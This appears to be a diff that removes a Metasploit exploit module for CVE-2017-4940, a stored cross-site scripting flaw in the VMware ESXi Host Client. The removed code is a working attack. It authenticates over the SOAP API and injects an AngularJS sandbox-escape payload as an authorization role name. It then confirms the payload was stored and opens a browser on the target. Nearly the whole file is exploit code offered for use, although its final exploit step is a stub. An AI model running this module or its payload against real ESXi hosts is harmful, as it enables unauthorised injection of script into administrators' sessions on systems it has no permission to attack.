@@ -1,0 +1,110 @@
+--- cve_2017_4940.rb	2019-04-24 03:21:16.000000000 -0400
++++ /usr/share/metasploit-framework/modules/exploits/multi/http/cve_2017_4940.rb	1969-12-31 19:00:00.000000000 -0500
+@@ -1,107 +0,0 @@
+-require 'msf/core'
+-
+-class MetasploitModule < Msf::Exploit::Remote
+-  Rank = GoodRanking
+-
+-  include Msf::Exploit::Remote::HttpClient
+-
+-  def initialize(info = {})
+-    super(update_info(info,
+-      'Name'           => 'CVE-2017-4940',
+-      'Description'    => %q{
+-      	The ESXi Host Client in VMware ESXi (6.5 before ESXi650-201712103-SG, 
+-        5.5 before ESXi600-201711103-SG and 5.5 before ESXi550-201709102-SG) contains a vulnerability that may allow for stored cross-site scripting (XSS). 
+-        An attacker can exploit this vulnerability by injecting Javascript, which might get executed when other users access the Host Client.
+-      },
+-      'Author'         => 'jason3e7',
+-      'References'     =>
+-        [
+-          [ 'CVE', '2017-4940' ],
+-        ],
+-      'Platform'       => 'linux',
+-      'Targets'        =>        
+-        [
+-          [ 'Automatic', {} ]
+-        ],
+-      'DefaultTarget' => 0))
+-
+-    register_options(
+-      [
+-        Opt::RPORT(443),
+-        OptBool.new('SSL', [ false, 'Negotiate SSL/TLS for outgoing connections', true]),
+-        OptString.new('USERNAME', [ true, "Username to authenticate with", '']),
+-        OptString.new('PASSWORD', [ true, "Password to authenticate with", ''])
+-      ])
+-  end
+-
+-  def check
+-
+-    loginXml = '<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Body><Login xmlns="urn:vim25"><_this type="SessionManager">ha-sessionmgr</_this>'
+-    loginXml += '<userName>' + datastore['USERNAME'] + '</userName>' 
+-    loginXml += '<password>' + datastore['PASSWORD'] + '</password><locale>en-US</locale></Login></Body></Envelope>'
+-
+-    res = send_request_raw({
+-      'uri'	=> normalize_uri(datastore['TARGETURI'], "/sdk/"),
+-      'method'  => 'POST',
+-      'data'    => loginXml,
+-      'headers' =>
+-      {
+-        'Content-Type'	 => 'text/xml',
+-        'SOAPAction'     => 'urn:vim25/6.5'
+-      }
+-    }, 5)
+-
+-    cookie = res.headers['Set-Cookie'].split('; ')[0]
+-
+-    xssPayload = '<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Body><AddAuthorizationRole xmlns="urn:vim25"><_this type="AuthorizationManager">ha-authmgr</_this><name>{{\'a\'.constructor.prototype.charAt=[].join;$eval(\'x=alert(1)\');}}</name></AddAuthorizationRole></Body></Envelope>'
+-  
+-    res = send_request_raw({
+-      'uri'	=> normalize_uri(datastore['TARGETURI'], "/sdk/"),
+-      'method'  => 'POST',
+-      'data'    => xssPayload,
+-      'cookie'  => cookie,
+-      'headers' =>
+-      {
+-        'Content-Type'	 => 'text/xml',
+-        'SOAPAction'     => 'urn:vim25/6.5'
+-      }
+-    }, 5)
+-
+-    if res.code == 500
+-      print_status("The specified name may already exists.")
+-    end
+-
+-    checkPayload = '<Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><Body><RetrievePropertiesEx xmlns="urn:vim25"><_this type="PropertyCollector">ha-property-collector</_this><specSet><propSet><type>AuthorizationManager</type><all>false</all><pathSet>roleList</pathSet></propSet><objectSet><obj type="AuthorizationManager">ha-authmgr</obj><skip>false</skip></objectSet></specSet><options/></RetrievePropertiesEx></Body></Envelope>'
+-    
+-    res = send_request_raw({
+-      'uri'	=> normalize_uri(datastore['TARGETURI'], "/sdk/"),
+-      'method'  => 'POST',
+-      'data'    => checkPayload,
+-      'cookie'  => cookie,
+-      'headers' =>
+-      {
+-        'Content-Type'	 => 'text/xml',
+-        'SOAPAction'     => 'urn:vim25/6.5'
+-      }
+-    }, 5)
+-   
+-    if res.body.include? "<label>{{&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=alert(1)&apos;);}}</label>"
+-      print_good("Inserted XSS successfully, please login to check it !")
+-      print_status("Path : Storage -> Datastores -> Actions -> Permissions")
+-      url = "https://" + datastore['RHOST'] + "/ui/"
+-      `firefox -url #{url}`
+-      return Exploit::CheckCode::Appears
+-    else
+-      return Exploit::CheckCode::Unknown
+-    end
+-    
+-  end
+-
+-  def exploit
+-    fail_with(Failure::None, "Not have exploit")
+-
+-    handler
+-  end
+-
+-end
+-
